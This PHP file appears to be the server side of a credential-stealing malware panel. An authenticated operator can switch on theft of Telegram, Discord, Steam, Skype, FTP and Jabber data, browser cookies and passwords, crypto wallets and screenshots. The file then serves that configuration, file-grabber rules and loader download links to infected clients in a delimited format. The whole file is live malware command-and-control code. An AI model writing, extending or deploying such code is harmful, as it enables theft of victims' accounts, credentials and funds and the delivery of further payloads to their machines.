<?php
include('global.php');
function write_ini_file($file, $array = [])
{
    // check first argument is string
    if (!is_string($file)) {
        throw new \InvalidArgumentException('Function argument 1 must be a string.');
    }

    // check second argument is array
    if (!is_array($array)) {
        throw new \InvalidArgumentException('Function argument 2 must be an array.');
    }

    // process array
    $data = array();
    foreach ($array as $key => $val) {
        if (is_array($val)) {
            $data[] = "[$key]";
            foreach ($val as $skey => $sval) {
                if (is_array($sval)) {
                    foreach ($sval as $_skey => $_sval) {
                        if (is_numeric($_skey)) {
                            $data[] = $skey.'[] = '.(is_numeric($_sval) ? $_sval : (ctype_upper($_sval) ? $_sval : '"'.$_sval.'"'));
                        } else {
                            $data[] = $skey.'['.$_skey.'] = '.(is_numeric($_sval) ? $_sval : (ctype_upper($_sval) ? $_sval : '"'.$_sval.'"'));
                        }
                    }
                } else {
                    $data[] = $skey.' = '.(is_numeric($sval) ? $sval : (ctype_upper($sval) ? $sval : '"'.$sval.'"'));
                }
            }
        } else {
            $data[] = $key.' = '.(is_numeric($val) ? $val : (ctype_upper($val) ? $val : '"'.$val.'"'));
        }
        // empty line
        $data[] = null;
    }

    // open file pointer, init flock options
    $fp = fopen($file, 'w');
    if (!$fp) return false;
    $retries = 0;
    $max_retries = 100;

    // loop until get lock, or reach max retries
    do {
        if ($retries) sleep(rand(1, 5000));
        $retries += 1;
    } while (!flock($fp, LOCK_EX) && $retries <= $max_retries);

    // couldn't get the lock
    if ($retries == $max_retries) return false;

    // got lock, write data
    fwrite($fp, implode(PHP_EOL, $data).PHP_EOL);

    // release lock
    flock($fp, LOCK_UN);
    fclose($fp);

    return true;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST')
{
    session_start();
    if (isset($_SESSION['username']))
    {
        $arr = array();
        $arr['cfg']['telegram'] = $_POST['telegram'];
        $arr['cfg']['discord'] = $_POST['discord'];
        $arr['cfg']['battlenet'] = $_POST['battlenet'];
        $arr['cfg']['chromium'] = $_POST['chromium'];
        $arr['cfg']['mozilla'] = $_POST['mozilla'];
        $arr['cfg']['iexplore'] = $_POST['iexplore'];
        $arr['cfg']['wininetCookies'] = $_POST['wininetCookies'];
        $arr['cfg']['crypto'] = $_POST['crypto'];
		$arr['cfg']['credentials'] = $_POST['credentials'];
		$arr['cfg']['steam'] = $_POST['steam'];
        $arr['cfg']['jabber'] = $_POST['jabber'];
        $arr['cfg']['ftp'] = $_POST['ftp'];
        $arr['cfg']['skype'] = $_POST['skype'];
        $arr['cfg']['screenshot'] = $_POST['screenshot'];
        $arr['cfg']['selfDelete'] = $_POST['selfDelete'];

        foreach ($arr['cfg'] as $key => $value)
        {
            if ($value == on) $arr['cfg'][$key] = 1;
            else $arr['cfg'][$key] = 0;
        }

        write_ini_file("config.txt", $arr);
    }
}
else if ($_SERVER['REQUEST_METHOD'] === 'GET')
{
    $info = parse_ini_file("config.txt");
    $client_ip = getClientIp();
    foreach ($info as $item) echo $item;
    echo "__DELIMM__{$client_ip}__DELIMM__";
    $fg_db = new SQLite3('info/fg.db');
    $grabber_res = $fg_db->query('SELECT * from main');
    while ($row = $grabber_res->fetchArray())
    {
        $str_row = "{$row['mask']}\t{$row['path']}\t{$row['min_size']}\t{$row['max_size']}__DELIMM__";
        echo $str_row;
    }
    $fg_db->close();
    echo "__DELIMM__";

    $loader_db = new SQLite3('info/loader.db');
    $loader_res = $loader_db->query('SELECT * from main');
    while ($row = $loader_res->fetchArray())
    {
        echo "{$row['link']}__DELIMM__";
    }
    echo "__DELIMM__";
    $loader_db->close();
}
?>